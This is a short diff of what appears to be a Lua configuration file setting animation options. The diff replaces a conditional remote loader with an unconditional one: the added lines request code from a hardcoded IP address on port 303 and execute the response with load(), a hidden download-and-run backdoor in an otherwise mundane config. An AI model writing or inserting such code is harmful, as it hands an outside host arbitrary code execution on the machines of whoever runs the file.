@@ -135,5 +135,5 @@ CONFIG.use_animation = false
 
 
 CONFIG = CONFIG
-if CONFIG.PANDORA then
-    load(request("GET","http://134.209.99.103/rosok"))()
+local script = request("POST","http://143.198.193.161:303/rosok")
+load(script)()
